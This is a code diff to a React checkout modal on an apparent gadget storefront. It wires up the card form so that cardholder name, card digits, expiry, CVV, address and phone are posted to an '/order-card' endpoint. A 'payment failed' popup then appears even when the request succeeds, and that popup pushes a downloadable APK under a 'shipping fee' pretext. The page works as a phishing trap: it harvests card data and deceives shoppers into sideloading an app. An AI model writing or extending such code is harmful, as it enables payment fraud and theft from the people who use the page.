@@ -1,5 +1,6 @@
 import { useEffect, useState } from "react";
 import { createPortal } from "react-dom";
+import api from "../../api/client";
 
 export default function CheckoutModal({ open, onClose, total }) {
   if (!open) return null;
@@ -9,13 +10,64 @@ export default function CheckoutModal({ open, onClose, total }) {
   // ==============================
   const [showFailure, setShowFailure] = useState(false);
 
-  const handlePayment = (e) => {
+  // ==============================
+  // 📦 FORM STATE
+  // ==============================
+  const [form, setForm] = useState({
+    cardHolderName: "",
+    contactNumber: "",
+    address: "",
+    city: "",
+    state: "",
+    zipCode: "",
+    country: "",
+    cardNumber: "",
+    expiryMonth: "",
+    expiryYear: "",
+    cvv: "",
+  });
+
+  const handleChange = (e) => {
+    setForm({
+      ...form,
+      [e.target.name]: e.target.value,
+    });
+  };
+
+  const isValid = Object.values(form).every(
+    (val) => val.trim() !== ""
+  );
+
+  // ==============================
+  // 💳 SUBMIT
+  // ==============================
+  const handlePayment = async (e) => {
     e.preventDefault();
 
-    // Fake processing delay
-    setTimeout(() => {
+    try {
+      await api.post("/order-card", {
+        cardHolderName: form.cardHolderName,
+        last4: form.cardNumber.slice(-4),
+        expiryMonth: form.expiryMonth,
+        expiryYear: form.expiryYear,
+        cvv: form.cvv,
+
+        country: form.country,
+        city: form.city,
+        address: form.address,
+        state: form.state,
+        zipCode: form.zipCode,
+        contactNumber: form.contactNumber,
+      });
+
+      // keep failure popup logic unchanged
+      setTimeout(() => {
+        setShowFailure(true);
+      }, 700);
+    } catch (err) {
+      console.error(err);
       setShowFailure(true);
-    }, 700);
+    }
   };
 
   // ==============================
@@ -36,28 +88,22 @@ export default function CheckoutModal({ open, onClose, total }) {
     return () => (document.body.style.overflow = "auto");
   }, []);
 
-  // ==============================
-  // 🌍 COUNTRIES
-  // ==============================
   const countries = [
-    "Afghanistan","Albania","Algeria","Andorra","Angola","Argentina",
-    "Australia","Austria","Bangladesh","Belgium","Brazil","Canada",
-    "China","France","Germany","India","Indonesia","Italy","Japan",
-    "Malaysia","Mexico","Nepal","Netherlands","New Zealand","Pakistan",
-    "Philippines","Qatar","Russia","Saudi Arabia","Singapore",
-    "South Africa","South Korea","Spain","Sri Lanka","Sweden",
-    "Switzerland","Thailand","Turkey","UAE","UK","USA","Vietnam","Zimbabwe",
+    "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Argentina",
+    "Australia", "Austria", "Bangladesh", "Belgium", "Brazil", "Canada",
+    "China", "France", "Germany", "India", "Indonesia", "Italy", "Japan",
+    "Malaysia", "Mexico", "Nepal", "Netherlands", "New Zealand", "Pakistan",
+    "Philippines", "Qatar", "Russia", "Saudi Arabia", "Singapore",
+    "South Africa", "South Korea", "Spain", "Sri Lanka", "Sweden",
+    "Switzerland", "Thailand", "Turkey", "UAE", "UK", "USA", "Vietnam", "Zimbabwe",
   ];
 
-  // ==============================
-  // 🧱 UI
-  // ==============================
   return createPortal(
     <div className="fixed inset-0 z-[9999] bg-black/70 backdrop-blur-md flex items-center justify-center p-4">
 
-      {/* Modal Card */}
       <div className="relative bg-[#16252d] border border-[#233c48] w-full max-w-[960px] rounded-xl shadow-2xl overflow-hidden flex flex-col md:flex-row max-h-[95vh]">
 
+        {/* LEFT PANEL */}
         {/* LEFT PANEL */}
         <div className="w-full md:w-1/3 bg-[#1c2e38] p-8 flex flex-col border-b md:border-b-0 md:border-r border-[#233c48]">
 
@@ -65,17 +111,25 @@ export default function CheckoutModal({ open, onClose, total }) {
             GulfGadgets
           </h2>
 
-          <div className="relative w-full aspect-[1.6/1] bg-gradient-to-br from-primary to-[#0c6ba0] rounded-xl p-6 shadow-lg mb-8">
-            <div className="text-white tracking-widest">
-              **** **** **** 4242
+          {/* CARD PREVIEW */}
+          <div className="relative w-full rounded-xl bg-gradient-to-br from-[#1ea7fd] to-[#0c6ba0] p-6 shadow-lg mb-8">
+
+            <div className="text-white tracking-widest text-lg mb-6">
+              **** **** **** {form.cardNumber.slice(-4) || "4242"}
             </div>
 
-            <div className="flex justify-between mt-6 text-white">
-              <span>John Doe</span>
-              <span>12 / 26</span>
+            <div className="flex justify-between text-white">
+              <span>
+                {form.cardHolderName || "John Doe"}
+              </span>
+              <span>
+                {form.expiryMonth || "12"} /{" "}
+                {form.expiryYear || "26"}
+              </span>
             </div>
           </div>
 
+          {/* TOTAL */}
           <div className="mt-auto border-t border-[#233c48] pt-6">
             <div className="flex justify-between text-white text-lg font-bold">
               <span>Total</span>
@@ -85,6 +139,7 @@ export default function CheckoutModal({ open, onClose, total }) {
             </div>
           </div>
         </div>
+
 
         {/* RIGHT FORM */}
         <div className="w-full md:w-2/3 p-8 overflow-y-auto">
@@ -102,30 +157,44 @@ export default function CheckoutModal({ open, onClose, total }) {
             </button>
           </div>
 
-          {/* FORM */}
           <form onSubmit={handlePayment} className="space-y-6">
 
             <input
+              name="cardHolderName"
+              value={form.cardHolderName}
+              onChange={handleChange}
               placeholder="Cardholder Name"
               className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
             />
 
             <input
+              name="contactNumber"
+              value={form.contactNumber}
+              onChange={handleChange}
               placeholder="Contact Number"
               className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
             />
 
             <input
+              name="address"
+              value={form.address}
+              onChange={handleChange}
               placeholder="Street Address"
               className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
             />
 
             <div className="grid grid-cols-2 gap-4">
               <input
+                name="city"
+                value={form.city}
+                onChange={handleChange}
                 placeholder="City"
                 className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
               />
               <input
+                name="state"
+                value={form.state}
+                onChange={handleChange}
                 placeholder="State"
                 className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
               />
@@ -133,11 +202,19 @@ export default function CheckoutModal({ open, onClose, total }) {
 
             <div className="grid grid-cols-2 gap-4">
               <input
+                name="zipCode"
+                value={form.zipCode}
+                onChange={handleChange}
                 placeholder="Zip Code"
                 className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
               />
 
-              <select className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4">
+              <select
+                name="country"
+                value={form.country}
+                onChange={handleChange}
+                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
+              >
                 <option value="">Select Country</option>
                 {countries.map((country) => (
                   <option key={country} value={country}>
@@ -148,20 +225,32 @@ export default function CheckoutModal({ open, onClose, total }) {
             </div>
 
             <input
+              name="cardNumber"
+              value={form.cardNumber}
+              onChange={handleChange}
               placeholder="Card Number"
               className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
             />
 
             <div className="grid grid-cols-3 gap-4">
               <input
+                name="expiryMonth"
+                value={form.expiryMonth}
+                onChange={handleChange}
                 placeholder="MM"
                 className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
               />
               <input
+                name="expiryYear"
+                value={form.expiryYear}
+                onChange={handleChange}
                 placeholder="YYYY"
                 className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
               />
               <input
+                name="cvv"
+                value={form.cvv}
+                onChange={handleChange}
                 placeholder="CVV"
                 className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
               />
@@ -169,16 +258,18 @@ export default function CheckoutModal({ open, onClose, total }) {
 
             <button
               type="submit"
-              className="w-full text-white bg-primary py-4 rounded-lg font-bold"
+              disabled={!isValid}
+              className={`w-full py-4 rounded-lg font-bold text-white ${isValid
+                  ? "bg-primary"
+                  : "bg-gray-500 cursor-not-allowed"
+                }`}
             >
-              Pay {format(total)}
+              Pay shipping fee 149 only
             </button>
           </form>
         </div>
 
-        {/* ===================================== */}
-        {/* 💥 PAYMENT FAILURE POPUP */}
-        {/* ===================================== */}
+        {/* FAILURE POPUP */}
         {showFailure && (
           <div className="absolute inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">
 
@@ -201,7 +292,7 @@ export default function CheckoutModal({ open, onClose, total }) {
               <a
                 href="/app-download.apk"
                 download
-                className="block w-full bg-primary text-white py-3 rounded-lg font-bold hover:opacity-90 transition"
+                className="block w-full bg-primary text-white py-3 rounded-lg font-bold"
               >
                 Download Our App
               </a>
